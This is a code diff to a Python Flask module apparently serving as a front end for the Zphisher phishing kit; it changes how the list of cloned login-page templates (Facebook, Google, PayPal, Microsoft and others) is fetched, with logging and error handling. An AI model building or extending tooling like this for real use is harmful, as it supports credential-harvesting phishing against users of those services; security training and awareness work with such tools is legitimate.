@@ -206,46 +206,44 @@ def stop_session(session_id):
         return True
 
 def fetch_zphisher_templates():
+    """
+    Fetch Zphisher templates by reading the 'sites' directory inside Zphisher.
+    Fixes the WSL/VS Code discrepancy where the directory may be visible in VS Code (Windows) but not in WSL due to case sensitivity, permissions, or dynamic creation.
+    If the directory does not exist, attempts to initialize it by running zphisher.sh.
+    Logs all steps and errors using app.logger.
+    Returns an empty list if no templates are found after initialization.
+    """
+    import os
     import subprocess
-    import re
+    from flask import current_app as app
+    ZPHISHER_DIR = os.path.dirname(ZPHISHER_PATH)
+    template_dir = os.path.join(ZPHISHER_DIR, 'sites')  # Use exact case 'sites'
     try:
-        proc = subprocess.Popen(['bash', ZPHISHER_PATH], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-        output, _ = proc.communicate(timeout=20)
-        print("Zphisher raw output for template fetch:")
-        print(output)
+        app.logger.debug(f"Checking for Zphisher sites directory at: {template_dir}")
+        if not os.path.exists(template_dir):
+            app.logger.warning(f"Sites directory not found. Attempting to initialize by running zphisher.sh...")
+            try:
+                proc = subprocess.Popen(['bash', ZPHISHER_PATH], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+                proc.communicate(timeout=30)
+            except Exception as e:
+                app.logger.error(f"Failed to run zphisher.sh for initialization: {e}")
+        if not os.path.exists(template_dir):
+            app.logger.error(f"Sites directory still not found after initialization attempt: {template_dir}")
+            return []
+        # List template directories
         templates = []
-        # Try to match [1] Facebook, 1) Facebook, or 1. Facebook
-        regexes = [
-            re.compile(r"\[\s*(\d+)\s*\]\s+(.+)", re.IGNORECASE),
-            re.compile(r"^(\d+)\)\s+(.+)", re.IGNORECASE),
-            re.compile(r"^(\d+)\.\s+(.+)", re.IGNORECASE)
-        ]
-        for line in output.splitlines():
-            for regex in regexes:
-                match = regex.match(line.strip())
-                if match:
-                    templates.append(match.group(2).strip())
-                    break
-            if any(x in line for x in ["Select An Attack", "Select an option", "Enter your choice"]):
-                break
-        print("Parsed templates:", templates)
+        for entry in os.listdir(template_dir):
+            entry_path = os.path.join(template_dir, entry)
+            if os.path.isdir(entry_path) and not entry.startswith('.'):
+                templates.append(entry)
         if not templates:
-            print("No templates found. Using fallback.")
-            return [
-                "Facebook", "Instagram", "Google", "Microsoft", "Netflix", "Paypal", "Twitter", "LinkedIn",
-                "GitHub", "Wordpress", "Yahoo", "Twitch", "Pinterest", "Reddit", "Steam", "VK", "Yandex",
-                "DevianArt", "Protonmail", "Spotify", "Adobe", "Shopify", "Messenger", "Dropbox", "eBay",
-                "Badoo", "Origin", "CryptoCoin", "XBOX", "MediaFire", "GitLab", "PornHub", "Custom"
-            ]
+            app.logger.warning(f"No templates found in sites directory: {template_dir}")
+        else:
+            app.logger.info(f"Found templates: {templates}")
         return templates
     except Exception as e:
-        print(f"Zphisher template fetch error: {e}")
-        return [
-            "Facebook", "Instagram", "Google", "Microsoft", "Netflix", "Paypal", "Twitter", "LinkedIn",
-            "GitHub", "Wordpress", "Yahoo", "Twitch", "Pinterest", "Reddit", "Steam", "VK", "Yandex",
-            "DevianArt", "Protonmail", "Spotify", "Adobe", "Shopify", "Messenger", "Dropbox", "eBay",
-            "Badoo", "Origin", "CryptoCoin", "XBOX", "MediaFire", "GitLab", "PornHub", "Custom"
-        ]
+        app.logger.error(f"Error fetching Zphisher templates: {e}", exc_info=True)
+        raise RuntimeError(f"Failed to fetch Zphisher templates: {e}")
 
 def get_history():
     with sessions_lock:
